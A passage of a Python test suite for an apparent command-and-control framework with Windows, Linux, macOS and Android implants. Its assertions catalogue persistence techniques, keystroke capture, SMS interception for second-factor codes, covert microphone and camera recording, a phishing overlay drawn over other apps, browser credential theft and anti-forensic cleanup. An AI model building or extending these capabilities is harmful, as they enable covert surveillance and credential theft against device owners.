    arms = set()
    for line in runner.splitlines():
        if "->" in line:
            arms.update(re.findall(r'"([a-z][a-z0-9.]*)"', line.split("->")[0]))
    # A kind the phone cannot run is not advertised: the server would
    # refuse to queue it, and the operator would never know why.
    refused = set(re.findall(r'"([a-z][a-z0-9.]*)" -> unsupported\(', runner))
    assert not (caps & refused)
    # Every advertised kind is one the runner answers.
    assert caps <= arms
    assert "else -> Outcome(2, ByteArray(0), \"unknown task kind" in runner
    # The phone runs a real foreground service with a notification.
    service = read_text("implant/android/app/src/main/java/io/umbra/beacon/BeaconService.kt")
    assert "startForeground" in service
    assert "Notification" in service
    # And it can tunnel.
    assert "tunnel" in caps


def test_the_macos_path_is_not_a_windows_story():
    """The persistence, the registry and the desktop work on a mac as well."""
    persist = read_text("implant/rust/src/persist.rs")
    for technique in ("launchd.agent", "launchd.daemon", "loginitem", "shell_rc", "cron.user"):
        assert f'"{technique}"' in persist
    assert 'platform: "macos"' in persist
    # The registry of a mac is a property list: the hive is a domain, the
    # key is a key of the domain and the service is a launchd job.
    registry = read_text("implant/rust/src/registry.rs")
    assert "/usr/bin/plutil" in registry
    assert "/usr/bin/defaults" in registry
    assert "launchctl" in registry
    # The desktop of a mac: the screen, the clipboard and the keys.
    desktop = read_text("implant/rust/src/desktop.rs")
    assert "screencapture" in desktop
    assert "pbpaste" in desktop
    assert "CGEventTapCreate" in desktop


# ---------------------------------------------------------------------------
# 13. The standard the suite holds itself to
# ---------------------------------------------------------------------------
def _run_tool(name: str) -> tuple:
    """Run one of the tools of the repository and report what it said."""
    import subprocess

    proc = subprocess.run(
        [sys.executable, os.path.join(ROOT, "tools", name)],
        capture_output=True, text=True, timeout=180,
    )
    return proc.returncode, proc.stdout + proc.stderr


def _checker_module(name: str):
    """Load one of the checkers, so the tests can ask it a question."""
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        name.replace(".", "_"), os.path.join(ROOT, "tools", name)
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_the_three_checkers_agree_on_the_tree():
    """The static checks are part of the suite.

    The invariants between the implementations are not a thing the CI
    remembers to run: they are checked by the same run that proves the
    behaviour, so a drift cannot pass the suite and fail the pipeline.
    """
    for name in ("check_consistency.py", "check_symbols.py", "check_go_symbols.py"):
        code, out = _run_tool(name)
        assert code == 0, f"{name} says no:\n{out}"


def test_every_documented_rpc_answers_on_the_mock_server():
    """The whole RPC surface answers.

    Every command the protocol document lists is sent to the reference
    server.  A command may be refused -- the arguments of the test are
    empty -- but it has to say why, and it has to answer at all: a
    command that is silently ignored is a command the operator cannot
    trust.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    commands = _checker_module("check_consistency.py").doc_rpc_commands()
    assert len(commands) >= 80, "the protocol document lost its commands"

    token = b"operator-token-surface-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client = None
    try:
        client = OperatorClient(server.address, token.decode(), "alice", timeout=20)
        client.connect()
        for cmd in sorted(commands):
            res = client.rpc(cmd, {})
            if not res.ok:
                assert res.error, f"{cmd} failed without a reason"
    finally:
        if client is not None:
            client.close()
        server.stop()


def test_the_mock_server_refuses_what_the_role_may_not_do():
    """The refusal path: a viewer is refused, and the refusal says why."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    admin_token = b"operator-token-admin-0123456789ab"
    viewer_token = b"operator-token-viewer-0123456789a"
    server = MockServer(
        AGENT_PSK,
        {"admin": admin_token, "viewer": viewer_token},
        roles={"admin": "admin", "viewer": "viewer"},
    )
    server.start()
    client = None
    try:
        client = OperatorClient(server.address, viewer_token.decode(), "viewer", timeout=20)
        client.connect()
        res = client.rpc("agents.kill", {"id": "nobody"})
        assert not res.ok
        assert "permission denied" in res.error
        # A command a viewer may run still works.
        res = client.rpc("whoami", {})
        assert res.ok
        assert res.data.get("role") == "viewer"
    finally:
        if client is not None:
            client.close()
        server.stop()


def test_no_test_in_the_suite_asserts_nothing():
    """A test that asserts nothing is a test that always passes.

    The suite is the proof of the mandate, so a test that cannot fail is
    worse than no test at all: it looks like evidence and it is not.
    """
    import ast

    tree = ast.parse(read_text("tests/test_protocol.py"))
    empty = []
    for node in tree.body:
        if not isinstance(node, ast.FunctionDef) or not node.name.startswith("test_"):
            continue
        asserted = any(isinstance(n, ast.Assert) for n in ast.walk(node))
        expected = any(
            isinstance(n, ast.Call)
            and isinstance(n.func, ast.Attribute)
            and n.func.attr == "raises"
            for n in ast.walk(node)
        )
        if not (asserted or expected):
            empty.append(node.name)
    assert not empty, f"tests that assert nothing: {empty}"


def test_the_suite_waits_for_what_it_wants():
    """The suite does not sleep and hope.

    A fixed sleep before a check is a test that is slow on a slow
    machine and flaky on a fast one.  The only sleep that is left is the
    one that widens a window on purpose.
    """
    import ast

    tree = ast.parse(read_text("tests/test_protocol.py"))
    inside_loops = set()
    for node in ast.walk(tree):
        if isinstance(node, (ast.While, ast.For)):
            for sub in ast.walk(node):
                inside_loops.add(id(sub))
    strays = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        if not isinstance(node.func, ast.Attribute) or node.func.attr != "sleep":
            continue
        if id(node) in inside_loops:
            continue
        # The one sleep that is not a wait: it widens the window of a
        # race on purpose.
        if "widen the window on purpose" in read_text("tests/test_protocol.py").splitlines()[node.lineno - 1]:
            continue
        strays.append(node.lineno)
    assert not strays, f"sleeps that wait for nothing: {strays}"


def test_the_consistency_check_detects_an_undocumented_event():
    """An event the server emits and the document does not list is a bug.

    The operator console reacts to the name of an event, so a name that
    only exists in the code is a promise the console cannot keep.
    """
    def add_event(rel, text):
        if rel.endswith("server/internal/hub/hub.go"):
            return text.replace('Kind: "agent.new"', 'Kind: "agent.newcomer"', 1)
        return text

    code, out = _run_checker("check_consistency.py", add_event)
    assert code == 1, out
    assert "EVENTS" in out
    assert "agent.newcomer" in out


def test_the_protocol_document_lists_every_event():
    """The table of the events is the contract with the consoles."""
    kinds = _checker_module("check_consistency.py")
    documented = kinds.doc_event_kinds()
    emitted = kinds.code_event_kinds()
    assert len(documented) >= 50
    assert emitted == documented


def test_a_task_carries_its_deadline_and_its_timeout():
    """The promise the operator makes is kept by the server.

    A task that passed its deadline is cancelled instead of delivered, and
    the timeout travels to the beacon so the implant stops the work itself.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"limits-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-limits", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        # The task carries the deadline and the timeout.
        task_id = client.submit("agent-limits", "shell",
                                 {"cmd": "echo hello"},
                                 deadline="2030-01-01T00:00:00Z", timeout=45)
        record = client.task(task_id)
        assert record.get("deadline"), record
        assert record.get("timeout") == 45, record

        # The timeout travels to the beacon inside the arguments.
        assert server.tasks[task_id]["args"]["timeout"] == 45

        # A deadline that is not a time is refused, with a reason.
        res = client.rpc("task.submit", {"id": "agent-limits", "kind": "shell",
                                         "deadline": "when the coffee is ready"})
        assert not res.ok
        assert "deadline" in res.error, res.error

        # A task that passed its deadline is cancelled, not delivered.
        late = client.submit("agent-limits", "shell", {"cmd": "echo late"},
                             deadline=str(int(time.time()) - 5))
        server.sweep_tasks(300)
        record = client.task(late)
        assert record["state"] == "cancelled", record
        assert "deadline" in str(record.get("err", "")), record

        # The event says it too.
        kinds = [e.get("kind") for e in client.events(limit=200).get("events", [])]
        assert "task.expired" in kinds, kinds
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_catalogue_of_the_techniques_is_the_whole_one():
    """Every technique of the specification is in the catalogue.

    The catalogue of the persistence manager is the specification of what
    the implant can do to a host: a technique that is not in the catalogue
    cannot be installed, verified or removed, and a technique in the
    catalogue without an implementation is a promise the manager breaks.
    """
    rust = read_text("implant/rust/src/persist.rs")
    required = {
        "windows": [
            "schtasks", "registry.run", "registry.runonce", "registry.explorer_run",
            "service", "service.dll", "startup", "wmi.event", "registry.com",
            "dll.searchorder", "registry.appinit", "registry.ifeo",
            "registry.printmonitor", "registry.shell_ext", "taskxml",
            "registry.winlogon", "bcdedit",
        ],
        "linux": [
            "systemd.system", "systemd.user", "systemd.timer",
            "systemd.execstartpre", "cron.user", "cron.d", "rc.local", "init.d",
            "profile", "profile.alias", "profile.env", "ld_preload",
            "xdg_autostart", "at", "kernel.module",
        ],
        "macos": [
            "launchd.daemon", "launchd.agent", "loginitem", "shell_rc",
            "cron.user", "xdg_autostart",
        ],
    }
    def between(text: str, first: str, second: str) -> str:
        start = text.index(first)
        end = text.index(second, start + len(first))
        return text[start:end]

    # The three arms of the manager: install, remove and verify.
    arms = {
        "install": between(rust, "fn install_technique(", "fn remove_technique("),
        "remove": between(rust, "fn remove_technique(", "fn verify_technique("),
        "verify": between(rust, "fn verify_technique(", "fn write_unit("),
    }
    for platform, techniques in required.items():
        for technique in techniques:
            assert f'id: "{technique}", platform: "{platform}"' in rust, (
                platform, technique)
            # The manager knows how to install it, to read it back and to
            # take it away again: three arms, one technique.
            for arm, text in arms.items():
                assert f'"{technique}"' in text, (technique, arm)

    # The same id may live on two platforms, and the lookup has to answer
    # with the entry of the platform the implant runs on: a crontab on a
    # mac is not the crontab of a linux.
    for shared in ("cron.user", "xdg_autostart"):
        platforms = [p for p, techniques in required.items()
                     if shared in techniques]
        assert len(platforms) >= 2, shared
    assert "t.id == id && t.platform == platform" in rust, (
        "the lookup has to prefer the entry of this platform")

    kotlin = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                        "Persistence.kt")
    for technique in ("boot_receiver", "foreground_service", "alarm",
                      "jobscheduler", "app_update", "accessibility",
                      "device_owner"):
        assert f'Technique("{technique}"' in kotlin, technique
        # The install, the remove and the verification of the phone.
        assert kotlin.count(f'"{technique}" ->') >= 3, technique

    # The phone's new techniques are real components of the application.
    manifest = read_text("implant/android/app/src/main/AndroidManifest.xml")
    for component in (".UmbraJobService", ".UmbraAccessibilityService",
                      ".UpdateReceiver", ".UmbraAdminReceiver"):
        assert component in manifest, component


def test_the_guide_of_the_host_says_what_the_manufacturer_does():
    """The guide: what keeps the implant alive on a host, and what stops it.

    A phone is the strictest host there is: the manufacturer decides which
    applications may start on their own, and on a Redmi a boot receiver
    alone is not enough.  The guide answers that question, and it has to
    name the screen that shows the permission -- the implant cannot take
    it by itself, the user of the phone has to press the button.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    kotlin = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "Vendor.kt")
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "TaskRunner.kt")
    beacon = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "Beacon.kt")
    manifest = read_text("implant/android/app/src/main/AndroidManifest.xml")
    rust = read_text("implant/rust/src/task.rs")
    evade = read_text("implant/rust/src/evade.rs")

    # The desktop answers the same question with what the operating
    # system can tell: the idle time, the power and the persistence.
    assert '"host.guide" =>' in rust
    assert "pub fn guide()" in evade
    assert "pub fn presence()" in evade
    assert "GetLastInputInfo" in evade
    assert "GetSystemPowerStatus" in evade

    # The phone answers it with the rules of the manufacturer.
    assert '"host.guide" ->' in runner
    assert "host.guide" in runner
    for step in ("battery", "autostart", "notifications", "standby"):
        assert f'id = "{step}"' in kotlin, step
    # The autostart list of Xiaomi is the reason a boot receiver alone is
    # not enough, and the implant opens that screen.
    assert "miui.intent.action.OP_AUTO_START" in kotlin
    assert "com.miui.permcenter.autostart" in kotlin
    # The permission the screen of the battery optimisation asks for.
    assert "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" in manifest
    # The state of the phone is read from the system, not guessed.
    assert "isIgnoringBatteryOptimizations" in kotlin
    assert "standbyBucket" in kotlin
    assert "areNotificationsEnabled" in kotlin
    # A phone whose screen is off is quieter.
    assert "screenFactor" in beacon
    assert "isInteractive" in beacon

    # The mock answers the task, so the console and the tests see one
    # shape everywhere.
    token = b"guide-token-0123456789abc"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-guide", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")
        task_id = client.submit("agent-guide", "host.guide", {})
        assert wait_until(
            lambda: client.task(task_id).get("state") in ("done", "failed"),
            timeout=15), "the guide never came back"
        record = client.task(task_id)
        assert record.get("state") == "done", record
        output = record.get("output") or record.get("out") or ""
        if isinstance(output, bytes):
            output = output.decode("utf-8", "replace")
        assert "guide:" in output, record
        assert "persistence entries" in output, record
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_accessibility_service_gives_the_operator_the_screen_of_the_phone():
    """The window of the phone, seen through the accessibility service.

    An application on a phone cannot see what the user is looking at; the
    accessibility service is the one permission that can.  It is also the
    loudest permission of the phone, so the technique has to be visible in
    the report and the guide has to say whether it is on.

    The test checks the three halves of it: the phone asks for the window
    content and the service really reads it and acts on it, the kinds are
    advertised and implemented, and the reference server answers them.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    config = read_text("implant/android/app/src/main/res/xml/"
                       "accessibility_service_config.xml")
    service = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                        "UmbraAccessibilityService.kt")
    bridge = read_text("implant/android/app/src/main/java/io/umbra/beacon/Ui.kt")
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "TaskRunner.kt")
    vendor = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "Vendor.kt")
    protocol = read_text("docs/PROTOCOL.md")

    # The phone asks for the window content and for the events that carry
    # it.  Without that the service may only keep the implant alive.
    assert 'android:canRetrieveWindowContent="true"' in config, (
        "the accessibility service does not ask for the window content")
    assert "typeWindowContentChanged" in config, (
        "the accessibility service does not watch the content of the window")
    assert "flagReportViewIds" in config, (
        "the accessibility service cannot name the nodes it presses")

    # The service reads the window and acts on it.
    assert "rootInActiveWindow" in service, "the service does not read the window"
    assert "AccessibilityNodeInfo.ACTION_CLICK" in service, (
        "the service cannot press a button")
    assert "AccessibilityNodeInfo.ACTION_SET_TEXT" in service, (
        "the service cannot write into a field")
    assert "performGlobalAction" in service, (
        "the service cannot press the system keys")
    assert "AccessibilityNodeInfo.ACTION_SCROLL_FORWARD" in service, (
        "the service cannot scroll the window")

    # The bridge carries the answer back to the task.
    assert "CountDownLatch" in bridge, "the bridge does not wait for the answer"
    assert "fun screen(root: AccessibilityNodeInfo?)" in bridge, (
        "the bridge does not walk the tree of the window")
    assert "fun matches(" in bridge and "fun fields(" in bridge, (
        "the bridge cannot find the node to press")
    assert "the accessibility service is not enabled" in runner, (
        "a phone without the service would pretend that nothing happened")

    # The guide says whether the service is on.
    assert "Ui.isEnabled()" in vendor, "the guide does not say it"

    # The kinds are advertised, implemented and documented.
    kinds = ("ui.screen", "ui.tap", "ui.text", "ui.scroll", "ui.global",
             "ui.events")
    for kind in kinds:
        assert f'"{kind}"' in runner, kind
        assert f"| `{kind}` |" in protocol, kind

    # And the reference server answers them.
    token = b"window-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-window", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")
        for kind, args in (
            ("ui.screen", {}),
            ("ui.events", {}),
            ("ui.tap", {"needle": "Allow"}),
            ("ui.text", {"needle": "Search", "value": "proxy"}),
            ("ui.scroll", {"direction": "forward"}),
            ("ui.global", {"action": "home"}),
        ):
            task_id = client.submit("agent-window", kind, args)
            assert wait_until(
                lambda: client.task(task_id).get("state") in ("done", "failed"),
                timeout=15), f"{kind} never came back"
            record = client.task(task_id)
            assert record.get("state") == "done", record
            output = record.get("output") or record.get("out") or ""
            if isinstance(output, bytes):
                output = output.decode("utf-8", "replace")
            assert "ui:" in output, record
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_key_that_is_bound_to_one_agent_may_not_claim_another():
    """The identity of a host is proved by its key, not by the name it says.

    A fleet key belongs to everybody: whoever holds it may claim any
    name.  A key that is bound to one agent id may not claim another
    one, so a key that is stolen impersonates one machine and not the
    whole fleet.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    bound = b"bound-agent-key-0123456789"
    token = b"identity-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token},
                        agent_keys={"host-bound": bound})
    server.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    agents = []
    try:
        client.connect()

        # The beacon that proves the bound key and claims its own name is
        # served.
        honest = FakeAgent(server.address, bound, "host-bound", interval=0.2)
        honest.start()
        agents.append(honest)
        assert wait_until(
            lambda: any(a.get("id") == "host-bound" for a in client.agents()),
            timeout=10), "the beacon with its own key never showed up"

        # The beacon that proves the same key and claims another name is
        # refused: the key is bound to one host.
        impostor = FakeAgent(server.address, bound, "host-other", interval=0.2)
        impostor.start()
        agents.append(impostor)
        assert not wait_until(
            lambda: any(a.get("id") == "host-other" for a in client.agents()),
            timeout=3), "a bound key may not claim another name"

        # The fleet key still works for the beacons that were built before
        # the per-agent keys existed.
        fleet = FakeAgent(server.address, AGENT_PSK, "host-fleet", interval=0.2)
        fleet.start()
        agents.append(fleet)
        assert wait_until(
            lambda: any(a.get("id") == "host-fleet" for a in client.agents()),
            timeout=10), "the fleet key has to keep working"
    finally:
        client.close()
        for agent in agents:
            agent.stop()
        server.stop()


def test_the_key_of_the_beacons_is_the_same_on_both_sides():
    """The operator writes the key as hex, and both sides decode it.

    The server prints the key as hex and the beacons read it as hex.  If
    one side took the text and the other took the bytes behind it, the
    server and the implants would not share a key at all -- and nothing
    would say so until a beacon failed to check in.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import decode_psk, decode_psk_bytes  # noqa: WPS433

    hexed = "00112233445566778899aabbccddeeff"
    assert decode_psk(hexed) == bytes.fromhex(hexed)
    assert decode_psk_bytes(hexed.encode()) == bytes.fromhex(hexed)
    # A value that is not hex is taken as it is.
    raw = "agent-psk-0123456789abcdef0123"
    assert decode_psk(raw) == raw.encode()
    assert decode_psk_bytes(raw.encode()) == raw.encode()
    # The binary of the tests stays binary.
    binary = bytes(range(32))
    assert decode_psk_bytes(binary) == binary

    # The Go server decodes the hex the same way.
    go = read_text("server/internal/config/config.go")
    assert "func DecodePSK(" in go, "the server does not decode the key"
    assert "c.Keyring.AgentPSK = DecodePSK(agentPSK)" in go, (
        "the server keeps the text of the key instead of its bytes")
    # The rotation keeps the bytes and shows the hex.
    ring = read_text("server/internal/keyring/keyring.go")
    assert "k.agentPSK = fresh" in ring, "the rotation does not keep the bytes"
    # The implants read hex.
    rust = read_text("implant/rust/src/config.rs")
    assert "hex_decode(&psk_raw)" in rust, "the beacon does not read hex"
    kotlin = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "RemoteConfig.kt")
    assert "Crypto.unhex(pskHex)" in kotlin, "the phone does not read hex"


def test_the_senses_of_the_phone_answer_what_the_platform_allows():
    """The place of the phone, the networks around it and the people in it.

    A collector that answers "nothing" when a permission was refused is a
    phone that lies, so the test checks that every collector reports the
    permission it needed -- and that the kinds are advertised,
    implemented and documented.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    sense = read_text("implant/android/app/src/main/java/io/umbra/beacon/Sense.kt")
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "TaskRunner.kt")
    manifest = read_text("implant/android/app/src/main/AndroidManifest.xml")
    protocol = read_text("docs/PROTOCOL.md")

    # The permissions are asked for in the manifest: a collector cannot
    # read what the platform never gave.
    for permission in (
        "ACCESS_FINE_LOCATION",
        "ACCESS_COARSE_LOCATION",
        "ACCESS_WIFI_STATE",
        "BLUETOOTH_SCAN",
        "READ_SMS",
        "READ_CALL_LOG",
        "READ_CONTACTS",
        "RECORD_AUDIO",
        "CAMERA",
    ):
        assert f'android.permission.{permission}' in manifest, permission

    # Every collector says what it could not read.
    assert "the location permission is not granted" in sense, (
        "the location would pretend that the phone is nowhere")
    assert "the sms permission is not granted" in sense, (
        "the messages would pretend that the phone has none")
    assert "the call log permission is not granted" in sense, (
        "the call log would pretend that nobody ever called")
    assert "the contacts permission is not granted" in sense, (
        "the address book would pretend that it is empty")
    assert "the bluetooth permission is not granted" in sense, (
        "the bluetooth would pretend that nothing is around")
    assert '"not rooted"' in read_text(
        "implant/android/app/src/main/java/io/umbra/beacon/AppDump.kt"), (
        "the databases of another application would pretend to be readable")
    assert "is not readable without root" in read_text(
        "implant/android/app/src/main/java/io/umbra/beacon/AppDump.kt"), (
        "the phone would pretend that it reads the storage of another app")

    # The kinds are advertised, implemented and documented.
    kinds = ("gps.locate", "wifi.dump", "bluetooth.scan", "contacts.dump",
             "sms.dump", "call.logs", "emulator.detect")
    for kind in kinds:
        assert f'"{kind}"' in runner, kind
        assert f"| `{kind}` |" in protocol, kind

    # And the reference server answers them.
    token = b"senses-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-senses", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")
        for kind, args in (
            ("gps.locate", {}),
            ("wifi.dump", {}),
            ("bluetooth.scan", {}),
            ("contacts.dump", {"limit": 10}),
            ("sms.dump", {"limit": 10}),
            ("call.logs", {"limit": 10}),
            ("emulator.detect", {}),
        ):
            task_id = client.submit("agent-senses", kind, args)
            assert wait_until(
                lambda: client.task(task_id).get("state") in ("done", "failed"),
                timeout=15), f"{kind} never came back"
            record = client.task(task_id)
            assert record.get("state") == "done", record
            output = record.get("output") or record.get("out") or ""
            if isinstance(output, bytes):
                output = output.decode("utf-8", "replace")
            assert output, f"{kind} answered nothing"
            assert kind.split(".")[0] in output, (kind, output)
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_watchers_of_the_phone_keep_what_arrives():
    """The watchers wait for the phone to have something to say.

    The queue has to survive a reboot, the phone has to connect again
    the moment something arrives, and the operator has to be able to
    empty the queue of one watcher without touching the other.
    """
    watch = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                      "Watch.kt")
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "TaskRunner.kt")
    beacon = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "Beacon.kt")
    protocol = read_text("docs/PROTOCOL.md")

    # The queue is on the disk of the implant: a phone that rebooted in
    # the middle of the night still has the message of yesterday.
    assert "watch.queue" in watch, "the queue is not durable"
    assert "fun append(" in watch and "fun drain(" in watch, (
        "the queue cannot be written or emptied")

    # The phone asks the beacon to connect again the moment something
    # arrives: the operator does not wait for the next check-in to read
    # the code of the second factor.
    assert "fun wake()" in beacon, "the beacon cannot be woken up"
    assert "BeaconService.wake()" in watch, (
        "the watcher does not ask the beacon to connect again")
    assert "fun wake()" in read_text(
        "implant/android/app/src/main/java/io/umbra/beacon/BeaconService.kt"), (
        "the service cannot wake the beacon")

    # The message arrives through the broadcast of the platform.
    assert "android.provider.Telephony.SMS_RECEIVED" in watch, (
        "the watcher of the messages does not listen to the broadcast")
    assert "OnPrimaryClipChangedListener" in watch, (
        "the watcher of the clipboard does not listen to the clipboard")

    # The kinds are advertised, implemented and documented.
    for kind in ("sms.watch", "clipboard.sniff"):
        assert f'"{kind}"' in runner, kind
        assert f"| `{kind}` |" in protocol, kind


def test_the_ears_and_the_eyes_of_the_phone():
    """The microphone, the camera and the screen of the phone.

    The capture of the screen is the one capability the platform never
    gives away, so the implant has to ask the user and say so.
    """
    media = read_text("implant/android/app/src/main/java/io/umbra/beacon/Media.kt")
    projection = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                            "Projection.kt")
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "TaskRunner.kt")
    beacon = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "Beacon.kt")
    protocol = read_text("docs/PROTOCOL.md")

    # The ears and the eyes.
    assert "MediaRecorder" in media, "the phone cannot record the sound"
    assert "AudioSource.MIC" in media, "the recorder does not open the microphone"
    assert "CameraManager" in media and "ImageFormat.JPEG" in media, (
        "the phone cannot take a picture")
    assert "LENS_FACING_BACK" in media, "the camera cannot look at the room"

    # The screen: the user has to press the button of the system dialog.
    assert "createScreenCaptureIntent" in projection, (
        "the capture of the screen does not ask the user")
    assert "getMediaProjection" in projection, (
        "the capture of the screen has no projection")
    assert "the user has to press the button" in runner, (
        "a capture that was never allowed would pretend to work")
    assert "TYPE_APPLICATION_OVERLAY" not in runner, (
        "the overlay does not belong to the capture")

    # The pictures travel as partial results: a frame of the protocol
    # cannot hold a picture, and a stream of them is bigger still.
    assert "partialValue" in runner, "the phone cannot stream a picture"
    assert "partial" in beacon, "the beacon does not send the chunks"

    # The kinds are advertised, implemented and documented.
    for kind in ("media.mic", "media.camera", "live.screen", "ui.stream"):
        assert f'"{kind}"' in runner, kind
        assert f"| `{kind}` |" in protocol, kind


def test_the_false_screen_of_the_phone():
    """The overlay that waits for an application and draws a form over it.

    The overlay is a deception, so the operator has to be able to end it
    at any moment, and the phone has to say that the permission to draw
    over the other applications is missing.
    """
    overlay = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                        "Overlay.kt")
    service = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                        "UmbraAccessibilityService.kt")
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "TaskRunner.kt")
    vendor = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "Vendor.kt")
    protocol = read_text("docs/PROTOCOL.md")

    # The overlay waits for the application the operator named, and the
    # accessibility service is what tells it that the application came
    # to the front.
    assert "TYPE_APPLICATION_OVERLAY" in overlay, (
        "the overlay is not drawn over the application")
    assert "Overlay.onWindow" in service, (
        "the service does not tell the overlay what came to the front")
    assert "the permission to draw over the other applications is not granted" in overlay, (
        "the overlay would pretend that it can be drawn")

    # The answer of the user travels to the queue of the watchers.
    assert "Watch.append" in overlay, "the answer of the user is lost"
    assert "fun dismiss(" in overlay, "the operator cannot end the overlay"

    # The guide says that the permission is one of the ones the user of
    # the phone grants.
    assert "SYSTEM_ALERT_WINDOW" in vendor, (
        "the guide does not mention the permission of the overlay")
    assert '"phish.overlay"' in runner, "the kind is not implemented"
    assert "| `phish.overlay` |" in protocol, "the kind is not documented"


def test_the_end_of_the_engagement_on_a_phone():
    """The traces of the implant, the databases and the way out.

    The phone has to say what it removed and what the platform refused
    to let it remove.
    """
    forensics = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                          "Forensics.kt")
    lab = read_text("implant/android/app/src/main/java/io/umbra/beacon/Lab.kt")
    runner = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                       "TaskRunner.kt")
    protocol = read_text("docs/PROTOCOL.md")

    # The laboratory: the sensors are what an emulator cannot fake.
    assert "TYPE_ACCELEROMETER" in lab, "the phone does not look at the sensors"
    assert "SIMULATOR_NUMBER" in lab, "the phone does not know the simulator"
    assert "ro.kernel.qemu" in lab, "the phone does not read the properties"

    # The end: the watchers, the capture, the persistence and the state.
    assert "SmsWatch.stop" in forensics, "the watchers keep running"
    assert "TaskRunner.removePersistence" in forensics, (
        "the persistence stays behind")
    assert "the phone asks the user to remove the application" in forensics, (
        "the phone would pretend that it removed itself")

    # The kinds are advertised, implemented and documented.
    for kind in ("app.dump", "anti.forensic", "evade.suicide"):
        assert f'"{kind}"' in runner, kind
        assert f"| `{kind}` |" in protocol, kind


def test_the_senses_of_the_desktop_answer_what_the_machine_allows():
    """The eight families that only a workstation can answer.

    Every family has to be implemented on the desktop, advertised by the
    reference server and documented -- and every one of them has to say
    what it could not read, because a report that pretends the machine
    has nothing to give is a lie.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    senses = read_text("implant/rust/src/senses.rs")
    task = read_text("implant/rust/src/task.rs")
    go_senses = read_text("implant/go/internal/beacon/senses.go")
    phone = read_text("implant/android/app/src/main/java/io/umbra/beacon/"
                      "Desktop.kt")
    protocol = read_text("docs/PROTOCOL.md")

    kinds = ("window.list", "clipboard.watch", "screen.stream",
             "wifi.profiles", "browser.creds", "av.survey", "usb.history",
             "proc.memory")

    # The desktop implant runs them.
    for kind in kinds:
        assert f'"{kind}"' in task, kind
        assert f"| `{kind}` |" in protocol, kind

    # The tools of the platform are used, and the API of Windows is used
    # directly where the platform says more than its tools do.
